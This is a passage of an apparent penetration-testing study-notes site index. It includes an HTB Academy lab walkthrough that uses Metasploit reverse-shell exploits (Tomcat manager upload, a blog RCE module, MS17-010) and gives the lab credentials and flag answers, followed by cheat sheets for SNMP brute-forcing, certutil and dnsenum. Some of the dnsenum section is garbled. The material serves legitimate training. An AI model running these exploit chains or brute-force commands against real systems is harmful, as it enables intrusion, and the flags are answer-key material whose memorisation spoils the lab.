<code>htb-student / HTB_@cademy_stdnt!</code> Can be used by RDP.</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#connectivity-to-the-foothold","title":"Connectivity To The Foothold","text":"<p>Connection Instructions: Accessing the Skills Assessment lab environment will require the use of XfreeRDP to provide GUI access to the virtual machine. We will be connecting to the Academy lab like normal utilizing your own VM with a HTB Academy VPN key or the Pwnbox built into the module section. You can start the FreeRDP client on the Pwnbox by typing the following into your shell once the target spawns:</p> <p>Code: bash <pre><code>xfreerdp /v:&lt;target IP&gt; /u:htb-student /p:HTB_@cademy_stdnt!\n</code></pre> You can find the target <code>IP</code>, <code>Username</code>, and <code>Password</code> needed below:</p> <ul> <li>Click below in the Questions section to spawn the target host and obtain an IP address.<ul> <li>IP ==</li> <li>Username == htb-student</li> <li>Password == HTB_@cademy_stdnt! Once you initiate the connection, you will be required to enter the provided credentials again in the window you see below:</li> </ul> </li> </ul> <p>Skills Assessment CAT5's team has secured a foothold into Inlanefrieght's network for us. Our responsibility is to examine the results from the recon that was run, validate any info we deem necessary, research what can be seen, and choose which exploit, payloads, and shells will be used to control the targets. Once on the VPN or from your Pwnbox, we will need to RDP into the foothold host and perform any required actions from there. Below you will find any credentials, IP addresses, and other info that may be required.</p> <p>Hosts 1-3 will be your targets for this skills challenge. Each host has a unique vector to attack and may even have more than one route built-in. The challenge questions below can be answered by exploiting these three hosts. Gain access and enumerate these targets. You will need to utilize the Foothold PC provided. The IP will appear when you spawn the targets. Attempting to interact with the targets from anywhere other than the foothold will not work. Keep in mind that the Foothold host has access to the Internal inlanefreight network (172.16.1.0/23 network) so you may want to pay careful attention to the IP address you pick when starting your listeners.</p> <p>xfreerdp /v: /u:htb-student /p:HTB_@cademy_stdnt! 10.129.213.83 <p>What is the hostname of Host-1? (Format: all lower case)</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#connect-to-the-parrot-machine","title":"Connect to the parrot machine","text":"<p>xfreerdp /v: /u:htb-student /p:HTB_@cademy_stdnt!"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#open-a-terminal-and-scan-ip-range-172161023","title":"Open a terminal and scan ip range 172.16.1.0/23","text":"<p>nmap 172.16.1.0/23</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#three-host-identified-11-12-and-13-host-1-is-11-perform-a-nmap-scan-on-open-ports","title":"Three host identified: .11, .12, and .13. Host-1 is .11. Perform a nmap scan on open ports:","text":"<p>sudo nmap -sC -sV 172.16.1.11 -p80,135,139,445,515,1801,2103,2105,2107,3389,8080</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#the-hostname-is-displayed","title":"The hostname is displayed","text":"<p>Results: SHELLS-WINSVR</p> <p>Exploit the target and gain a shell session. Submit the name of the folder located in C:\\Shares\\ (Format: all lower case)</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#the-parrot-machine-has-on-desktop-a-file-called-access-credstxt-it-contains-several-useful-creds-such-as-those-of-tomcat-service","title":"The Parrot machine has on Desktop a file called access-creds.txt. It contains several useful creds, such as those of Tomcat service.","text":""},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#one-of-the-services-listed-in-the-nmap-scanner-in-apache-tomcat-10011-running-on-8080-we-will-exploit-that-one","title":"One of the services listed in the nmap scanner in Apache Tomcat 10.0.11 running on 8080. We will exploit that one:","text":"<p>msfconsole -q search tomcat use multi/http/tomcat_mgr_upload set RHOSTS 172.16.1.11 set RPORT 8080 set target Windows Universal set payload payload/generic/shell_reverse_tcp </p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#after-gaining-access-go-to-cshares","title":"After gaining access, go to c:\\Shares","text":"<p>dir Results: dev-share</p> <p>What distribution of Linux is running on Host-2? (Format: distro name, all lower case)</p> <p>nmap -A 172.16.1.12 -p22,80 Results: Ubuntu</p> <p>What language is the shell written in that gets uploaded when using the 50064.rb exploit?</p> <p>Results: php</p> <p>Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#open-firefox-writting-in-the-terminal","title":"Open firefox writting in the terminal","text":"<p>firefox</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#open-the-blog-in-scope-httpbloginlinefreightlocal-and-click-on-login","title":"Open the blog in scope http://blog.inlinefreight.local and click on login","text":""},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#enter-the-creds-from-the-access-credstxt-file-adminadmin123","title":"Enter the creds from the access-creds.txt file: admin:admin123!@","text":""},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#the-new-interface-allows-you-to-upload-certain-contents-open-burpsuite-and-intercept-communications-also-observe-the-content-of-the-site-there-is-a-link-to-httpswwwexploit-dbcomexploits50064-about-lightweight-facebook-styled-blog-13-remote-code-execution-rce-authenticated-metasploit","title":"The new interface allows you to upload certain contents. Open Burpsuite and intercept communications. Also, observe the content of the site. There is a link to https://www.exploit-db.com/exploits/50064 about Lightweight facebook-styled blog 1.3 - Remote Code Execution (RCE) (Authenticated) (Metasploit)","text":""},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#open-a-terminal-on-the-parrot","title":"Open a terminal on the Parrot:","text":"<p>searchsploit Lightweight</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#you-will-see","title":"You will see","text":"<p>Lightweight facebook-styled blog 1.3 - Remote | php/webapps/50064.rb</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#print-the-path","title":"Print the path","text":"<p>searchsploit -m php/webapps/50064.rb</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#create-the-folders","title":"Create the folders","text":"<p>sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/ sudo mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#copy-the-exploit","title":"Copy the exploit","text":"<p>sudo cp 50064.rb mkdir /usr/share/metasploit-framework/modules/exploits/php/webapps/</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#reload-all-modules","title":"Reload all modules","text":"<p>reload_all</p>"},{"location":"CPTS/Shells%20and%20Payloads/skillAssessment/#now-when-searching-for-lightweight-we-could-access-the-exploit","title":"Now when searching for Lightweight, we could access the exploit","text":"<p><pre><code>search Lightweight\nuse exploit/php/webapps/50064\noptions\nset RHOSTS 172.16.1.12\nset TARGETURI /\nset VHOST blog.inlanefreight.local\nset USERNAME admin\nset PASSWORD admin123!@#\nrun\n</code></pre> <code>cat /customscripts/flag.txt</code> Results: <code>B1nD_Shells_r_cool</code></p> <p>What is the hostname of Host-3?</p> <p><pre><code>sudo nmap -A 172.16.1.13 -p80,135,139,445\n</code></pre> Results: SHELLS-WINBLUE</p> <p>Exploit and gain a shell session with Host-3. Then submit the contents of C:\\Users\\Administrator\\Desktop\\Skills-flag.txt</p> <p><pre><code>msfconsole -q\nuse exploit/windows/smb/ms17_010_psexec\nSET RHOSTS 172.16.1.13\nSET LHOST 172.16.1.5\nrun\n</code></pre> shell type C:\\Users\\Administrator\\Desktop\\Skills-flag.txt Results: <code>One-H0st-Down!</code></p>"},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/","title":"Understanding Shells and Payloads","text":""},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#what-is-a-shell","title":"What is a Shell?","text":"<p>A shell is a program that provides users with an interface to input instructions into a system and view text output. Examples include:</p> <ul> <li> <p>Bash</p> </li> <li> <p>Zsh</p> </li> <li> <p>cmd</p> </li> <li> <p>PowerShell</p> </li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#shells-in-penetration-testing","title":"Shells in Penetration Testing","text":"<p>In penetration testing, a shell is often the result of exploiting a vulnerability or bypassing security measures to gain interactive access to a host. Common phrases include:</p> <ul> <li> <p>\"I caught a shell.\"</p> </li> <li> <p>\"I popped a shell!\"</p> </li> <li> <p>\"I dropped into a shell!\"</p> </li> <li> <p>\"I'm in!\"</p> </li> </ul> <p>These phrases signify successful exploitation, granting remote control over the target's operating system shell. This is a common goal for penetration testers when accessing a vulnerable machine. Most of the focus in this area is on post-exploitation activities.</p>"},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#why-get-a-shell","title":"Why Get a Shell?","text":"<p>A shell provides direct access to:</p> <ul> <li> <p>The Operating System</p> </li> <li> <p>System Commands</p> </li> <li> <p>The File System</p> </li> </ul> <p>With a shell, penetration testers can:</p> <ul> <li> <p>Enumerate the system for further vulnerabilities</p> </li> <li> <p>Escalate privileges</p> </li> <li> <p>Pivot within the network</p> </li> <li> <p>Transfer files</p> </li> <li> <p>Maintain persistence</p> </li> </ul> <p>Establishing a shell session offers several advantages:</p> <ul> <li> <p>Allows usage of attack tools</p> </li> <li> <p>Facilitates exfiltration of data</p> </li> <li> <p>Eases documentation of attack details</p> </li> <li> <p>Provides access to the Command Line Interface (CLI), which is often harder to detect and faster to navigate than graphical interfaces like VNC or RDP</p> </li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#perspectives-on-shells","title":"Perspectives on Shells","text":"Perspective Description Computing Text-based environment for administering tasks and submitting instructions (e.g., Bash, cmd). Exploitation &amp; Security Result of exploiting vulnerabilities or bypassing security to access a host interactively. Web Exploiting a vulnerability (e.g., file upload) to create a web shell for issuing instructions."},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#payloads-deliver-us-shells","title":"Payloads Deliver Us Shells","text":""},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#what-is-a-payload","title":"What is a Payload?","text":"<p>A payload can vary in definition based on the context:</p> <ul> <li> <p>Networking: Encapsulated data in a packet.</p> </li> <li> <p>Basic Computing: The action-defining portion of an instruction set.</p> </li> <li> <p>Programming: Data carried by programming instructions.</p> </li> <li> <p>Exploitation &amp; Security: Code designed to exploit vulnerabilities and gain system access.</p> </li> </ul> <p>In penetration testing, payloads play a crucial role in:</p> <ul> <li> <p>Exploiting vulnerabilities</p> </li> <li> <p>Establishing remote shell sessions</p> </li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#examples-of-payloads","title":"Examples of Payloads","text":"<ul> <li> <p>Malware types (e.g., ransomware)</p> </li> <li> <p>Shell delivery mechanisms</p> </li> </ul>"},{"location":"CPTS/Shells%20and%20Payloads/understanding_shells_and_payloads/#key-takeaways","title":"Key Takeaways","text":"<ul> <li> <p>Shells provide essential access for enumeration, privilege escalation, and persistence.</p> </li> <li> <p>CLI-based shells offer stealth and efficiency.</p> </li> <li> <p>Understanding different perspectives of shells (computing, security, web) is crucial.</p> </li> <li> <p>Payloads are the means of delivering shells and enabling remote system access.</p> </li> </ul>"},{"location":"CPTS/Tools/Bitsadmin/","title":"Bitsadmin","text":""},{"location":"CPTS/Tools/Bitsadmin/#bitsadmin","title":"Bitsadmin","text":""},{"location":"CPTS/Tools/Braa/","title":"Braa","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/Braa/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul>"},{"location":"CPTS/Tools/Braa/#braa-cheat-sheet","title":"Braa Cheat Sheet","text":""},{"location":"CPTS/Tools/Braa/#overview","title":"Overview","text":"<p>braa is a fast, lightweight SNMP brute-force tool designed to query SNMP-enabled devices across large IP ranges. It\u2019s particularly useful for testing multiple community strings (similar to passwords) against a set of IP addresses to see if they reveal SNMP-accessible information. This is an effective approach for identifying devices configured with default or weak SNMP community strings, which can expose device details to unauthorized users.</p>"},{"location":"CPTS/Tools/Braa/#basic-syntax","title":"Basic Syntax","text":"<p>The basic syntax of braa is as follows:</p> <p>bash</p> <p>Copy code</p> <p><code>braa &lt;community_string&gt;@&lt;target_IP&gt;</code></p> <ul> <li><code>&lt;community_string&gt;</code>: The SNMP community string to use (e.g., <code>public</code>, <code>private</code>).</li> <li><code>&lt;target_IP&gt;</code>: The IP address of the SNMP-enabled device to query.</li> </ul> <p>Example:</p> <p>bash</p> <p>Copy code</p> <p><code>braa public@192.168.1.1</code></p> <p>This command queries the SNMP service on <code>192.168.1.1</code> using the <code>public</code> community string.</p>"},{"location":"CPTS/Tools/Braa/#basic-commands","title":"Basic Commands","text":"<ol> <li> <p>Single Target Query:</p> <p>bash</p> <p>Copy code</p> <p><code>braa public@192.168.1.1</code></p> <p>This sends an SNMP request using the <code>public</code> community string to a single IP address.</p> </li> <li> <p>Multiple Targets with a Single Community String:</p> <p>bash</p> <p>Copy code</p> <p><code>braa public@192.168.1.1 192.168.1.2 192.168.1.3</code></p> <p>This command queries multiple IP addresses using the <code>public</code> community string.</p> </li> <li> <p>Multiple Community Strings: You can specify different community strings by using <code>@</code> to separate each community string and IP address:</p> <p>bash</p> <p>Copy code</p> <p><code>braa public@192.168.1.1 private@192.168.1.2</code></p> <p>This queries <code>192.168.1.1</code> with the <code>public</code> community string and <code>192.168.1.2</code> with the <code>private</code> community string.</p> </li> <li> <p>Using Wildcards for Bulk Queries: If scanning a range of IP addresses with the same community string, you can specify wildcards:</p> <p>bash</p> <p>Copy code</p> <p><code>braa public@192.168.1.*</code></p> <p>This queries all IPs in the <code>192.168.1.*</code> range with the <code>public</code> community string.</p> </li> <li> <p>Specifying an OID: By default, braa queries the standard <code>1.3.6.1.2.1</code> subtree, but you can specify a custom OID to retrieve targeted information:</p> <p>bash</p> <p>Copy code</p> <p><code>braa public@192.168.1.1 1.3.6.1.2.1.1.5.0</code></p> <p>This queries the OID <code>1.3.6.1.2.1.1.5.0</code> (usually the device\u2019s hostname).</p> </li> </ol>"},{"location":"CPTS/Tools/Braa/#advanced-usage","title":"Advanced Usage","text":""},{"location":"CPTS/Tools/Braa/#using-braa-with-multiple-community-strings-from-a-file","title":"Using Braa with Multiple Community Strings from a File","text":"<p>If you want to test multiple community strings against a target list of IPs, you can do so by scripting braa with community strings from a file:</p> <p>bash</p> <p>Copy code</p> <p><code>while read community; do braa \"$community\"@192.168.1.*; done &lt; community_strings.txt</code></p> <p>Here:</p> <ul> <li><code>community_strings.txt</code> is a file containing a list of potential SNMP community strings.</li> <li>This command will iterate through each community string, querying the SNMP service for each IP in the <code>192.168.1.*</code> range.</li> </ul>"},{"location":"CPTS/Tools/Braa/#using-braa-with-nmap","title":"Using Braa with Nmap","text":"<p>You can pair braa with Nmap to first identify open SNMP ports and then target them specifically:</p> <ol> <li> <p>Identify SNMP-Enabled Devices with Nmap:</p> <p>bash</p> <p>Copy code</p> <p><code>nmap -sU -p 161 --open -oG snmp_hosts.txt 192.168.1.0/24</code></p> <p>This scans the specified subnet for open UDP port 161 and outputs results to <code>snmp_hosts.txt</code>.</p> </li> <li> <p>Filter and Use Output with Braa: Extract IPs of SNMP-enabled devices and pass them to braa.</p> <p>bash</p> <p>Copy code</p> <p><code>grep 'open' snmp_hosts.txt | awk '{print $2}' &gt; open_ips.txt while read ip; do braa public@\"$ip\"; done &lt; open_ips.txt</code></p> </li> </ol>"},{"location":"CPTS/Tools/Braa/#common-use-cases","title":"Common Use Cases","text":"<ol> <li> <p>SNMP Brute-Forcing: Braa is mainly used to brute-force community strings for SNMP services by testing common or default values like <code>public</code>, <code>private</code>, etc., across a range of devices.</p> </li> <li> <p>Network Enumeration: Using braa with correct community strings can reveal device information, system descriptions, network interfaces, and configurations, useful for mapping network topologies.</p> </li> <li> <p>Security Assessment: Identifying devices configured with weak SNMP community strings can help administrators secure them by changing defaults or upgrading to SNMPv3.</p> </li> </ol>"},{"location":"CPTS/Tools/Braa/#interpreting-results","title":"Interpreting Results","text":"<p>After running braa, results display information about each queried SNMP object. Typical information includes:</p> <ul> <li>Device Name and OS: Basic system information, which can be useful in identifying device types.</li> <li>Network Interfaces: Details about network interfaces on the device.</li> <li>Location and Contact: Location or contact information, if configured.</li> </ul> <p>Example Output:</p> <p>plaintext</p> <p>Copy code</p> <p><code>192.168.1.1 [public] Linux 3.10.0-1160.15.2.el7.x86_64 192.168.1.2 [public] Cisco IOS Software, C880 Software</code></p>"},{"location":"CPTS/Tools/Braa/#security-considerations","title":"Security Considerations","text":"<p>As with other SNMP brute-force tools, running braa in production environments without authorization could expose sensitive device information or disrupt network operations. It is recommended to:</p> <ul> <li>Ensure permission before scanning networks.</li> <li>Avoid using braa on SNMPv3-secured devices since it targets SNMPv1 and SNMPv2, which have weaker security.</li> </ul>"},{"location":"CPTS/Tools/Certutil/","title":"Certutil","text":""},{"location":"CPTS/Tools/Certutil/#certutil","title":"Certutil","text":"<p>Certutil is a versatile command-line utility included in Windows for managing certificates and keys, diagnosing issues, and performing various cryptographic operations. This cheatsheet covers its essential uses, from basic to advanced tasks.</p>"},{"location":"CPTS/Tools/Certutil/#basics","title":"Basics","text":""},{"location":"CPTS/Tools/Certutil/#display-help","title":"Display Help","text":"<pre><code>certutil -?\n</code></pre> <p>Displays the list of all available commands and options for certutil.</p>"},{"location":"CPTS/Tools/Certutil/#check-certutil-version","title":"Check Certutil Version","text":"<pre><code>certutil -version\n</code></pre> <p>Shows the installed version of certutil.</p>"},{"location":"CPTS/Tools/Certutil/#display-cryptographic-service-provider-csp-information","title":"Display Cryptographic Service Provider (CSP) Information","text":"<pre><code>certutil -csplist\n</code></pre> <p>Lists all available CSPs and their capabilities.</p>"},{"location":"CPTS/Tools/Certutil/#certificate-management","title":"Certificate Management","text":""},{"location":"CPTS/Tools/Certutil/#view-certificates-in-a-store","title":"View Certificates in a Store","text":"<pre><code>certutil -store my\n</code></pre> <p>Displays all certificates in the specified store (e.g., <code>my</code>, <code>CA</code>, <code>root</code>).</p>"},{"location":"CPTS/Tools/Certutil/#add-a-certificate-to-a-store","title":"Add a Certificate to a Store","text":"<pre><code>certutil -addstore root certfile.cer\n</code></pre> <p>Adds a certificate file to the specified store (e.g., <code>root</code>, <code>my</code>).</p>"},{"location":"CPTS/Tools/Certutil/#remove-a-certificate-from-a-store","title":"Remove a Certificate from a Store","text":"<pre><code>certutil -delstore my \"SerialNumber\"\n</code></pre> <p>Removes a certificate with the specified serial number from the store.</p>"},{"location":"CPTS/Tools/Certutil/#export-a-certificate","title":"Export a Certificate","text":"<pre><code>certutil -store my \"SerialNumber\" &gt; cert.cer\n</code></pre> <p>Exports a certificate to a <code>.cer</code> file.</p>"},{"location":"CPTS/Tools/Certutil/#verify-a-certificate","title":"Verify a Certificate","text":"<pre><code>certutil -verify certfile.cer\n</code></pre> <p>Validates a certificate\u2019s trust chain and revocation status.</p>"},{"location":"CPTS/Tools/Certutil/#private-keys","title":"Private Keys","text":""},{"location":"CPTS/Tools/Certutil/#export-private-key","title":"Export Private Key","text":"<pre><code>certutil -exportPFX my \"SerialNumber\" output.pfx\n</code></pre> <p>Exports a certificate and private key as a PFX file. May require permissions.</p>"},{"location":"CPTS/Tools/Certutil/#import-a-pfx-file","title":"Import a PFX File","text":"<pre><code>certutil -f -p \"password\" -importPFX my file.pfx\n</code></pre> <p>Imports a PFX file into the specified certificate store.</p>"},{"location":"CPTS/Tools/Certutil/#list-key-containers","title":"List Key Containers","text":"<pre><code>certutil -key\n</code></pre> <p>Lists key containers available on the system.</p>"},{"location":"CPTS/Tools/Certutil/#cryptographic-operations","title":"Cryptographic Operations","text":""},{"location":"CPTS/Tools/Certutil/#encode-a-file-to-base64","title":"Encode a File to Base64","text":"<pre><code>certutil -encode input.txt output.b64\n</code></pre> <p>Encodes the contents of <code>input.txt</code> to Base64 format.</p>"},{"location":"CPTS/Tools/Certutil/#decode-a-base64-file","title":"Decode a Base64 File","text":"<pre><code>certutil -decode input.b64 output.txt\n</code></pre> <p>Decodes a Base64-encoded file back to its original format.</p>"},{"location":"CPTS/Tools/Certutil/#hash-a-file","title":"Hash a File","text":"<pre><code>certutil -hashfile file.txt SHA256\n</code></pre> <p>Generates a hash for the specified file using algorithms like <code>MD5</code>, <code>SHA1</code>, or <code>SHA256</code>.</p>"},{"location":"CPTS/Tools/Certutil/#generate-a-random-key","title":"Generate a Random Key","text":"<pre><code>certutil -getrandom 32 random.key\n</code></pre> <p>Generates 32 random bytes and saves them to <code>random.key</code>.</p>"},{"location":"CPTS/Tools/Certutil/#diagnostics-and-troubleshooting","title":"Diagnostics and Troubleshooting","text":""},{"location":"CPTS/Tools/Certutil/#test-certificate-chain","title":"Test Certificate Chain","text":"<pre><code>certutil -verify -urlfetch certfile.cer\n</code></pre> <p>Performs a detailed test of a certificate\u2019s chain, including CRL and AIA retrieval.</p>"},{"location":"CPTS/Tools/Certutil/#check-configuration","title":"Check Configuration","text":"<pre><code>certutil -config -\n</code></pre> <p>Displays available certificate authorities (CAs) for enrollment.</p>"},{"location":"CPTS/Tools/Certutil/#test-connectivity-to-ca","title":"Test Connectivity to CA","text":"<pre><code>certutil -ping CAName\n</code></pre> <p>Tests connectivity to a specified CA.</p>"},{"location":"CPTS/Tools/Certutil/#decode-a-certificate-or-crl","title":"Decode a Certificate or CRL","text":"<pre><code>certutil -dump certfile.cer\n</code></pre> <p>Displays detailed information about a certificate or CRL.</p>"},{"location":"CPTS/Tools/Certutil/#advanced-tasks","title":"Advanced Tasks","text":""},{"location":"CPTS/Tools/Certutil/#create-a-self-signed-certificate","title":"Create a Self-Signed Certificate","text":"<pre><code>certutil -selfsign -f -v mycert.cer\n</code></pre> <p>Generates a self-signed certificate.</p>"},{"location":"CPTS/Tools/Certutil/#generate-a-certificate-request","title":"Generate a Certificate Request","text":"<pre><code>certutil -newreq -f -v myrequest.req mykey.key\n</code></pre> <p>Creates a certificate signing request (CSR) and saves the key.</p>"},{"location":"CPTS/Tools/Certutil/#retrieve-and-install-a-certificate-from-ca","title":"Retrieve and Install a Certificate from CA","text":"<pre><code>certutil -retrieve 1234 output.cer\ncertutil -addstore my output.cer\n</code></pre> <p>Retrieves a certificate by request ID (<code>1234</code>) and installs it.</p>"},{"location":"CPTS/Tools/Certutil/#view-ca-certificate-revocation-list-crl","title":"View CA Certificate Revocation List (CRL)","text":"<pre><code>certutil -viewstore root\n</code></pre> <p>Displays the CRL of a CA in the root store.</p>"},{"location":"CPTS/Tools/Certutil/#useful-tips","title":"Useful Tips","text":"<ul> <li> <p>Use <code>-f</code> to force an action if prompted for confirmation.</p> </li> <li> <p>Always back up critical certificates or keys before performing actions.</p> </li> <li> <p>Combine certutil with PowerShell or batch scripts for automation.</p> </li> </ul>"},{"location":"CPTS/Tools/Certutil/#resources","title":"Resources","text":"<ul> <li> <p>Microsoft Documentation on Certutil</p> </li> <li> <p>Explore <code>certutil -?</code> for additional advanced options.</p> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/","title":"DNSenum","text":"<p>[!tip]- Tips Write tips here</p>"},{"location":"CPTS/Tools/DNSenum/#references","title":"References","text":"<ul> <li>Layered Enumeration Framework Guide</li> <li>Comprehensive OSCP Enumeration Strategies</li> </ul> <pre><code>dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb\n</code></pre>"},{"location":"CPTS/Tools/DNSenum/#dnsenum-dns-enumeration-tool","title":"dnsenum - DNS Enumeration Tool","text":"<p>Objective: <code>dnsenum</code> is used for gathering DNS information such as subdomains, IP addresses, and other DNS-related information about a target domain.</p>"},{"location":"CPTS/Tools/DNSenum/#basic-command","title":"Basic Command","text":"<pre><code>dnsenum &lt;domain&gt;\n</code></pre> <ul> <li>Purpose: Performs basic DNS enumeration on the given domain.</li> <li>Example: <pre><code>dnsenum example.com\n</code></pre></li> </ul>"},{"location":"CPTS/Tools/DNSenum/#options-and-commands","title":"Options and Commands","text":"<ul> <li> <p><code>-r</code>: Reverse DNS lookup</p> <ul> <li>Purpose: Get a list of IPs that reverse resolve to the target domain.</li> <li>Command:</li> </ul> <p>bash</p> <p>Copy code</p> <p><code>dnsenum -r &lt;domain&gt;</code></p> </li> <li> <p><code>-f</code>: Use a wordlist for subdomain brute force</p> <ul> <li>Purpose: Attempt subdomain enumeration using a wordlist (default is <code>/usr/share/wordlists/dnsenum.txt</code>).</li> <li>Command:</li> </ul> <p>bash</p> <p>Copy code</p> <p><code>dnsenum -f /path/to/wordlist.txt &lt;domain&gt;</code></p> </li> <li> <p><code>-s</code>: Specify nameservers</p> <ul> <li>Purpose: Set custom nameservers for DNS queries.</li> <li>Command:</li> </ul> <p>bash</p> <p>Copy code</p> <p><code>dnsenum -s &lt;nameserver&gt; &lt;domain&gt;</code></p> </li> <li> <p><code>-t</code>: Enable trace route</p> <ul> <li>Purpose: Perform a trace route to the target domain to find intermediary hops.</li> <li>Command:</li> </ul> <p>bash</p> <p>Copy code</p> <p><code>dnsenum -t &lt;domain&gt;</code></p> </li> <li> <p><code>-v</code>: Verbose output</p> <ul> <li>Purpose: Provides more detailed output. Useful for debugging and understanding the process.</li> <li>Command:</li> </ul> <pre><code>dnsenum -v &lt;domain&gt;\n</code></pre> </li> <li> <p><code>-p</code>: Perform a zone transfer</p> <ul> <li>Purpose: Attempt a DNS zone transfer to gather all records from a DNS server.</li> <li>Command:</li> </ul> <p>```bash dnsenum -p  <pre><code>- **`-i`**: IP range for brute force\n\n    - **Purpose**: Specify an IP range for reverse DNS lookup brute-forcing.\n    - **Command**:\n\n    ```bash\ndnsenum -i 192.168.0.0/24 &lt;domain&gt;\n</code></pre>"},{"location":"CPTS/Tools/DNSenum/#example-command-breakdown","title":"Example Command Breakdown","text":"<pre><code>dnsenum -r -f /usr/share/wordlists/dnsenum.txt -v example.com\n</code></pre> <ul> <li><code>-r</code>: Perform reverse DNS lookup.</li> <li><code>-f /usr/share/wordlists/dnsenum.txt</code>: Use the specified wordlist for subdomain enumeration.</li> <li><code>-v</code>: Enable verbose output.</li> <li><code>example.com</code>: The target domain for enumeration.</li> </ul>"},{"location":"CPTS/Tools/DNSenum/#common-output-and-results","title":"Common Output and Results","text":"<ul> <li>Subdomain Enumeration: A list of discovered subdomains based on DNS records and brute-forcing.</li> <li>NS Lookup: Nameserver information, including authoritative DNS servers.</li> <li>MX Records: Mail exchange servers associated with the domain.</li> <li>Zone Transfers: If successful, a complete list of DNS records for the domain.</li> <li>PTR Records: Reverse DNS lookup for any IPs.</li> </ul>"},{"location":"CPTS/Tools/DNSenum/#dns-record-types-to-be-aware-of","title":"DNS Record Types to Be Aware Of","text":"<ul> <li>A: IPv4 address for a hostname.</li> <li>AAAA: IPv6 address for a hostname.</li> <li>MX: Mail exchange server.</li> <li>NS: Name servers for the domain.</li> <li>PTR: Reverse lookup (for IP address).</li> <li>TXT: Text records, often used for verification and SPF records.</li> </ul>"},{"location":"CPTS/Tools/DNSenum/#use-cases-for-oscp","title":"Use Cases for OSCP","text":"<ul> <li>Subdomain Enumeration: Discover hidden subdomains that could be vulnerable.</li> <li>Reverse DNS Lookup: Find IP addresses associated with a target domain and cross-reference with other tools (e.g., Shodan).</li> <li>Zone Transfers: If a DNS server is misconfigured, a zone transfer can provide a comprehensive list of domain records.</li> </ul> <p>Key Takeaways</p> <ul> <li>dnsenum is an essential tool for DNS enumeration in penetration testing.</li> <li>Familiarize yourself with the various flags and their use cases.</li> <li>Use the results to gather useful information for further exploitation or information gathering.</li> </ul> <p>Keep these notes handy for your OSCP preparations, and practice running the tool on various targets to become more comfortable with its outputs.</p>"},{"location":"CPTS/Tools/DNSenum/#advanced-dnsenum-commands","title":"Advanced dnsenum Commands","text":""},{"location":"CPTS/Tools/DNSenum/#1-brute-force-with-custom-wordlist","title":"1. Brute Force with Custom Wordlist","text":"<ul> <li>Objective: Perform aggressive subdomain enumeration using a custom wordlist.</li> <li> <p>Command:</p> <p>```bash dnsenum -f /path/to/custom_wordlist.txt -v  <pre><code>    - **Details**: Use a custom wordlist to find hidden subdomains. The `-v` flag adds verbosity to see more details during enumeration.\n\n#### **2. Zone Transfer with Specific Nameserver**\n\n- **Objective**: Attempt DNS zone transfer with a specific DNS server (if the server is misconfigured).\n- **Command**:\n\n\n    ```bash\n    dnsenum -p -s &lt;nameserver&gt; &lt;domain&gt;\n</code></pre> - Details: Specify the nameserver to try for zone transfers. If the DNS server is misconfigured, a zone transfer could provide all DNS records."},{"location":"CPTS/Tools/DNSenum/#3-dns-record-and-reverse-lookup","title":"3. DNS Record and Reverse Lookup","text":"<ul> <li>Objective: Retrieve a variety of DNS records (A, MX, NS, TXT, etc.) for further exploration, combined with reverse lookup for IPs.</li> <li> <p>Command:</p> <p><code>dnsenum -r -v -t -s &lt;nameserver&gt; &lt;domain&gt;</code></p> <ul> <li>Details:<ul> <li><code>-r</code> performs reverse DNS lookups.</li> <li><code>-t</code> includes trace route information to see the path DNS queries take.</li> <li><code>-v</code> enables verbose output for in-depth analysis.</li> <li><code>-s &lt;nameserver&gt;</code> allows specifying a particular DNS server.</li> </ul> </li> </ul> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/#4-brute-force-reverse-dns-lookup-for-ip-range","title":"4. Brute Force Reverse DNS Lookup for IP Range","text":"<ul> <li>Objective: Enumerate reverse DNS records for an entire range of IP addresses (useful for large networks).</li> <li> <p>Command:</p> <p><code>dnsenum -i 192.168.1.0/24 &lt;domain&gt;</code></p> <ul> <li>Details: The <code>-i</code> option will brute-force through the specified IP range to perform reverse lookups on IP addresses within that range.</li> </ul> </li> </ul>"},{"location":"CPTS/Tools/DNSenum/#5-dns-query-for-specific-record-types","title":"5. DNS Query for Specific Record Types","text":"<ul> <li>Objective: Query specific types of DNS records (e.g., only MX records or A records).</li> <li> <p>Command:</p> <p><code>dnsenum -t mx -v &lt;domain&gt;</code></p> <ul> <li>Details: Query and list 